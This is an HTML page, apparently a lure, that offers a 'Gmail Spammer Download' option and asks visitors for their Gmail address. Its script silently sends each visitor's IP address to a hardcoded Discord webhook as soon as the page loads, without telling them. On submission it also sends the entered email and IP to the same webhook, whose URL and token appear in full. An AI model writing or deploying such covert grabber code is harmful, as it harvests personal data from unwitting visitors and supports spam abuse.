<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dropdown Menu</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f0f0f0;
    }
    .container {
      text-align: center;
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      width: 300px;
    }
    select, input[type="email"] {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-top: 10px;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background-color: #45a049;
    }
    #status {
      margin-top: 15px;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Select an Option</h1>
    <select id="options">
      <option value="nothing">Nothing</option>
      <option value="gmail_spammer">Gmail Spammer Download</option>
    </select>
    <div id="email-container" style="display: none;">
      <label for="email">Enter Gmail:</label>
      <input type="email" id="email" placeholder="Type your Gmail here">
      <button id="submit">Submit</button>
    </div>
    <p id="status"></p>
  </div>

  <script>
    let lastSubmissionTime = 0; // Track the last submission time

    // Send IP address to the webhook on page load
    (async () => {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        const webhookUrl = 'https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr';

        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**New visitor IP:** ${userIP}`
          }),
        });
      } catch (error) {
        console.error('Error fetching IP or sending webhook:', error);
      }
    })();

    // Handle dropdown menu selection
    document.getElementById('options').addEventListener('change', (event) => {
      const emailContainer = document.getElementById('email-container');
      emailContainer.style.display = event.target.value === 'gmail_spammer' ? 'block' : 'none';
    });

    // Handle Gmail submission
    document.getElementById('submit').addEventListener('click', async () => {
      const email = document.getElementById('email').value;
      const status = document.getElementById('status');
      const currentTime = Date.now();

      // Check for spam (30-second cooldown)
      if (currentTime - lastSubmissionTime < 30000) {
        status.textContent = 'Please wait 30 seconds before submitting again.';
        status.style.color = 'red';
        return;
      }

      if (!email) {
        status.textContent = 'Please enter your Gmail.';
        status.style.color = 'red';
        return;
      }

      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        const webhookUrl = 'https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr';

        await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**Gmail Submitted:** ${email}\n**User IP:** ${userIP}`
          }),
        });

        status.textContent = 'Gmail and IP sent successfully!';
        status.style.color = 'green';
        lastSubmissionTime = currentTime; // Update the last submission time

      } catch (error) {
        console.error('Error:', error);
        status.textContent = 'An error occurred. Please try again later.';
        status.style.color = 'red';
      }
    });
  </script>
</body>
</html>
